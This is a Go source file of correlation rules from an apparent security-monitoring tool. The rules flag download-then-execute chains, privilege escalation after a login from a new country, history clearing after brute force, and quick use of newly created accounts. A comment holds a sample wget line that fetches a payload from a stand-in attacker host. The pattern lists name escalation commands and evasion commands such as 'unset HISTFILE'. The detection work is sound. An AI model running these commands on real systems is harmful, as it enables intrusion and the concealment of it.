package rules

import (
	"fmt"
	"nox/internal/model"
	"strings"
	"time"
)

type DownloadAndExecuteRule struct {
	Window time.Duration
}

func NewDownloadAndExecuteRule() CorrelationRule {
	return &DownloadAndExecuteRule{
		Window: 2 * time.Minute,
	}
}

func (r *DownloadAndExecuteRule) Name() string {
	return "CorrelatedDownloadAndExecute"
}

func (r *DownloadAndExecuteRule) extractFilePath(command string) string {
	parts := strings.Fields(command)

	for _, part := range parts {
		if strings.HasPrefix(part, "/tmp/") || strings.HasPrefix(part, "/dev/shm") {
			return part
		}
	}

	return ""
}

func (r *DownloadAndExecuteRule) Evaluate(event model.Event, existingAlerts []model.Alert, state *StateManager) *model.Alert {
	if event.EventType != "Process_Executed" {
		return nil
	}

	// full chain download -> make executable -> execute
	// wget -O /tmp/payload.sh http://evil.com/payload.sh
	s := state.StagedPayloads
	command := event.Metadata["command"]
	processName := event.Metadata["process_name"]

	// Stage 1: detect the download
	if processName == "wget" || processName == "curl" {
		filepath := r.extractFilePath(command)
		if filepath != "" {
			s.mu.Lock()
			s.Payloads[filepath] = event.Timestamp
			s.mu.Unlock()
		}
		return nil
	}

	// Stage 2: Detect execution
	s.mu.Lock()
	defer s.mu.Unlock()
	for stagedPath, downloadTime := range s.Payloads {
		if strings.Contains(command, stagedPath) && event.Timestamp.Sub(downloadTime) <= r.Window {
			delete(s.Payloads, stagedPath)
			return &model.Alert{
				RuleName:  r.Name(),
				Message:   fmt.Sprintf("Attack Chain Detected: A file was download to %s and then executed.", stagedPath),
				Severity:  "CRITICAL",
				Timestamp: event.Timestamp,
				Source:    event.Source,
				Metadata: map[string]string{
					"mitre_technique":   "T1105",
					"time_to_execution": event.Timestamp.Sub(downloadTime).String(),
					"executed_command":  command,
					"staged_filepath":   stagedPath,
				},
			}
		}
	}

	return nil
}

type LoginAndEscalationRule struct {
	PrivEscPatterns []string
	Window          time.Duration
}

func NewLoginAndEscalationRule() CorrelationRule {
	return &LoginAndEscalationRule{
		PrivEscPatterns: []string{
			"sudo su",
			"su -",
			"sudo -i",
			"sudo bash",
			"sudo sh",
		},
		Window: 10 * time.Minute,
	}
}

func (r *LoginAndEscalationRule) Name() string {
	return "CorrelatedLoginAndEscalation"
}

func (r *LoginAndEscalationRule) Evaluate(event model.Event, existingAlerts []model.Alert, state *StateManager) *model.Alert {
	s := state.SuspiciousLoginTracker
	// Stage 1: check for the start of the chain (a NewCountryLogin)
	for _, alert := range existingAlerts {
		if alert.RuleName == "NewCountryLogin" {
			s.mu.Lock()
			for ip, t := range s.Logins {
				if time.Since(t) > r.Window {
					delete(s.Logins, ip)
				}
			}

			s.Logins[alert.Source] = alert.Timestamp
			s.mu.Unlock()
			return nil
		}
	}

	// Stage 2: Check for the end of chain Privileged Escalation event
	if event.EventType == "Process_Executed" {
		isPrivEsc := false
		command := event.Metadata["command"]

		for _, pattern := range r.PrivEscPatterns {
			if strings.Contains(command, pattern) {
				isPrivEsc = true
				break
			}
		}

		if isPrivEsc {
			s.mu.Lock()
			defer s.mu.Unlock()

			if loginTime, ok := s.Logins[event.Source]; ok {
				if event.Timestamp.Sub(loginTime) <= r.Window {
					delete(s.Logins, event.Source)
					return &model.Alert{
						RuleName:  r.Name(),
						Message:   fmt.Sprintf("Attack Chain Detected: A Login from a new country (%s) was followed by a privile escalation attempt", event.Source),
						Severity:  "CRITICAL",
						Timestamp: event.Timestamp,
						Source:    event.Source,
						Metadata: map[string]string{
							"mitre_tactic":       "TA0004",
							"correlated_events":  "NewCountryLogin, PrivilegeEscalationAttempt",
							"time_to_escalation": event.Timestamp.Sub(loginTime).String(),
						},
					}
				}
			}
		}

	}

	return nil
}

type BruteForceAndEvasionRule struct {
	DefensiveEvasionPatterns []string
	Window                   time.Duration
}

func NewBruteForceAndEvasionRule() CorrelationRule {
	return &BruteForceAndEvasionRule{
		DefensiveEvasionPatterns: []string{
			"history -c",
			"unset HISTFILE",
			"rm /root/.bash_history",
		},
		Window: 5 * time.Minute,
	}
}

func (r *BruteForceAndEvasionRule) Name() string {
	return "CorrelatedBruteForceAndEvasion"
}

func (r *BruteForceAndEvasionRule) Evaluate(event model.Event, existingAlerts []model.Alert, state *StateManager) *model.Alert {
	switch event.EventType {
	case "SSHD_Accepted_Password":
		state.FailedLogins.mu.Lock()
		wasAlerted := state.FailedLogins.AlertedIPs[event.Source]
		if wasAlerted {
			delete(state.FailedLogins.AlertedIPs, event.Source)
		}
		state.FailedLogins.mu.Unlock()

		// during a Brute Force attack, more than likely we will have the IP in BruteForceAlertedIPs struct
		if wasAlerted {
			sshdPID := event.Metadata["sshd_pid"]
			if sshdPID != "" {
				loginInfo := PostBruteForceInfo{
					LoginTime: event.Timestamp,
					SourceIP:  event.Source,
				}
				state.PostBruteForceLogins.mu.Lock()
				state.PostBruteForceLogins.SuccessfulLogins[sshdPID] = loginInfo
				state.PostBruteForceLogins.mu.Unlock()
			}
		}
	case "Process_Executed":
		command := event.Metadata["command"]
		ppid := event.Metadata["ppid"]
		isDefensiveEvasion := false

		for _, pattern := range r.DefensiveEvasionPatterns {
			if strings.Contains(command, pattern) {
				isDefensiveEvasion = true
				break
			}
		}

		if isDefensiveEvasion {
			s := state.PostBruteForceLogins
			s.mu.Lock()
			defer s.mu.Unlock()

			if loginInfo, ok := s.SuccessfulLogins[ppid]; ok {
				if event.Timestamp.Sub(loginInfo.LoginTime) <= r.Window {
					delete(s.SuccessfulLogins, ppid)
					return &model.Alert{
						RuleName:  r.Name(),
						Message:   fmt.Sprintf("Attach Chain Detected: A successful login from %s after a brute-force was followed by the defenseive evasion command: '%s'", loginInfo.SourceIP, command),
						Severity:  "CRITICAL",
						Timestamp: event.Timestamp,
						Source:    loginInfo.SourceIP,
						Metadata: map[string]string{
							"mitre_tactic":      "TA0005",
							"correlated_events": "TooManyFailedLogins, SSHD_Accepted_Password, DefenseEvasionCommand",
							"source_ip":         loginInfo.SourceIP,
							"evasion_command":   command,
							"linked_sshd_pid":   ppid,
						},
					}
				}
			}
		}

	}

	return nil
}

type LocalAccountImmediateUseRule struct {
	Window time.Duration
}

func NewLocalAccountImmediateUseRule() CorrelationRule {
	return &LocalAccountImmediateUseRule{
		Window: 1 * time.Hour,
	}
}

func (r *LocalAccountImmediateUseRule) Name() string {
	return "CorrelatedNewAccountUsage"
}

func (r *LocalAccountImmediateUseRule) Evaluate(event model.Event, existingAlerts []model.Alert, state *StateManager) *model.Alert {
	switch event.EventType {
	case "Process_Executed":
		s := state.NewAccountTracker
		command := event.Metadata["command"]
		process := event.Metadata["process_name"]

		if process == "useradd" {
			parts := strings.Fields(command)
			if len(parts) > 1 {
				newUser := parts[len(parts)-1]
				s.mu.Lock()
				s.CreationTimes[newUser] = event.Timestamp
				s.mu.Unlock()
			}
		}
	case "SSHD_Accepted_Password":
		loginUser := event.Metadata["user"]
		if loginUser == "" {
			return nil
		}

		s := state.NewAccountTracker
		s.mu.Lock()
		defer s.mu.Unlock()

		if creationTime, ok := s.CreationTimes[loginUser]; ok {
			if event.Timestamp.Sub(creationTime) <= r.Window {
				delete(s.CreationTimes, loginUser)
				return &model.Alert{
					RuleName:  r.Name(),
					Message:   fmt.Sprintf("Attack Chain Detected: A new local account for user '%s' was created and used to log in shortly after.", loginUser),
					Severity:  "HIGH",
					Timestamp: event.Timestamp,
					Source:    event.Source,
					Metadata: map[string]string{
						"mitre_tactic":  "TA0003", // persistence
						"username":      loginUser,
						"time_to_login": event.Timestamp.Sub(creationTime).String(),
					},
				}
			}
		}

	}

	return nil
}
